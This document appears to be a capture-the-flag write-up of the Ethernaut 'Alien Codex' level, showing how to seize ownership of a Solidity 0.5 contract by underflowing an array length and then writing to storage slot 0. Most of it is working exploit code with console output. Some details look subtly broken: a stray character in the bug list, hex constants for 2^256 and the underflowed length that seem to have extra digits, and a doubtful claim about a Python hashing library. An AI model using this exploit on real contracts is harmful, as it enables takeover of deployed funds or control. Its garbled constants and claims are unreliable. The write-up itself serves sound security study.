# Ethernaut Alien Codex Writeup

## Level Overview

**Objective:** Become the `owner` of the `AlienCodex` contract.

**Contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

This challenge exploits two classic Solidity 0.5.x bugs:

1. **Integer underflow** on `codex.length--`5 no SafeMath, no checked arithmetic.
2. **No bounds checking** on dynamic array writes (`codex[i] = ...`), which allows arbitrary storage slot overwrite.

---

## Understanding the Storage Layout

The key to the exploit is understanding how Solidity lays out state variables in storage.

`AlienCodex` inherits from `Ownable`, which has:

```solidity
address private _owner;
```

Then `AlienCodex` declares:

```solidity
bool public contact;
bytes32[] public codex;
```

Solidity packs variables into 32-byte slots sequentially, but it **packs small types together** if they fit in one slot.

| Slot | Contents |
|------|----------|
| 0 | `_owner` (20 bytes) + `contact` (1 byte) — packed together |
| 1 | `codex.length` (array length) |
| ... | array data, starting at `keccak256(1)` |

**Key insight:** `codex` lives in **slot 1**, not slot 2, because `_owner` and `contact` are packed into slot 0.

This is crucial — using the wrong slot number will make the exploit fail silently.

You can verify the layout with:

```javascript
await web3.eth.getStorageAt(contract.address, 0) // owner + contact
await web3.eth.getStorageAt(contract.address, 1) // codex.length
```

---

## How Dynamic Arrays Work in Storage

For a dynamic array `bytes32[]` stored in slot `p`:

- **Slot `p`** holds the array length.
- **Element `i`** is stored at `keccak256(p) + i`.

So for `codex` in slot 1:

```
codex[0]  →  keccak256(1) + 0
codex[1]  →  keccak256(1) + 1
codex[i]  →  keccak256(1) + i   (mod 2^256)
```

The `revise(i, _content)` function performs `codex[i] = _content`, which writes to `keccak256(1) + i` — **with no bounds check**.

---

## The Two Bugs

### Bug 1 — Underflow in `retract()`

```solidity
function retract() public contacted {
    codex.length--;
}
```

If `codex.length == 0`, then `0 - 1 = 2^256 - 1` (no checked arithmetic in Solidity 0.5.x). The array length becomes the maximum possible value.

This unlocks the ability to write to **any index `i`**, because Solidity thinks the array has `2^256 - 1` elements.

### Bug 2 — Arbitrary storage write in `revise()`

```solidity
function revise(uint256 i, bytes32 _content) public contacted {
    codex[i] = _content;
}
```

Combined with the inflated length, we can now write to any storage slot by choosing `i` such that:

```
keccak256(1) + i ≡ target_slot   (mod 2^256)
```

We want to write to **slot 0**, where `owner` lives. So:

```
keccak256(1) + i ≡ 0   (mod 2^256)
i ≡ 2^256 - keccak256(1)
```

---

## Computing the Exploit Index

We need `keccak256(uint256(1))` computed the way Solidity does — hashing the 32-byte big-endian representation of `1`.

In JavaScript (web3):

```javascript
const keccakSlot1 = web3.utils.soliditySha3({ type: 'uint256', value: 1 });
// 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6

const i = web3.utils
  .toBN('0x1000000000000000000000000000000000000000000000000000000000000000000')
  .sub(web3.utils.toBN(keccakSlot1));

i.toString(16);
// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
```

In Python, using `eth_utils.keccak` (which in some environments returns NIST SHA-3 rather than Keccak-256 — use with caution):

```python
from eth_utils import keccak

slot = 1
keccak_val = int.from_bytes(keccak(slot.to_bytes(32, 'big')), 'big')
i = (2**256) - keccak_val
print(hex(i))
```

**Result:**

```
i = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
```

Sanity check:

```javascript
web3.utils.toBN(keccakSlot1).add(web3.utils.toBN(i)).mod(web3.utils.toBN(2).pow(web3.utils.toBN(256))).toString(16)
// "0"  
```

---

## The Exploit — Step by Step

In the Ethernaut browser console:

```javascript
// 1. Enable the `contacted` modifier.
await contract.makeContact();

// 2. Underflow the array length to 2^256 - 1.
await contract.retract();

// Optional: verify storage slot 1 now equals 0xffff...ffff
await web3.eth.getStorageAt(contract.address, 1);
// "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"

// 3. Overwrite slot 0 (owner) with our address.
//    `player` is the Ethernaut global for our address.
const i = '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a';
const myBytes32 = web3.utils.padLeft(player, 64);
await contract.revise(i, myBytes32);

// 4. Verify ownership.
await contract.owner();
// "0x7Ba1211CD2fcD7527Fc9848F3cDb231c3723e2A9"
```

Level completed.

---

## Why It Works — Intuition

Imagine storage as a huge array of 2^256 numbered boxes.

- Box 0: `owner`
- Box 1: `codex.length`
- Box `keccak256(1)`: `codex[0]`
- Box `keccak256(1) + 1`: `codex[1]`
- ...

Normally, `codex[i] = x` writes to box `keccak256(1) + i`. The array "wraps" around storage conceptually, because arithmetic is modulo 2^256.

If we pick `i = 2^256 - keccak256(1)`, then:

```
keccak256(1) + i = keccak256(1) + 2^256 - keccak256(1) = 2^256 ≡ 0
```

The write lands in **box 0** — exactly where `owner` lives. By writing our address there, we become the owner.

The `retract()` step is only needed to bypass the implicit length check that Solidity performs on array writes. With `codex.length = 2^256 - 1`, every possible `i` is "in bounds".

---

## Key Takeaways

1. **Always use SafeMath (or Solidity ≥ 0.8)** to prevent integer underflow/overflow.
2. **Dynamic array writes must be bounds-checked** — in Solidity 0.5.x they aren't, which allows arbitrary storage overwrite when combined with a corrupted length.
3. **Storage layout matters** — small types like `bool` and `address` are packed together. Always verify with `getStorageAt` instead of assuming slot numbers.
4. **Hash functions are not interchangeable** — `eth_utils.keccak` (Python), `web3.utils.keccak256`, and `web3.utils.soliditySha3` can produce different results in different environments. `soliditySha3` most closely mirrors what Solidity does.
5. **Compute the exploit index off-chain** — never try to do 256-bit Keccak arithmetic by hand.

---

*Written after completing the Ethernaut "Alien Codex" level. The exploit hinges on a storage collision between a mis-sized dynamic array and the contract's ownership slot.*
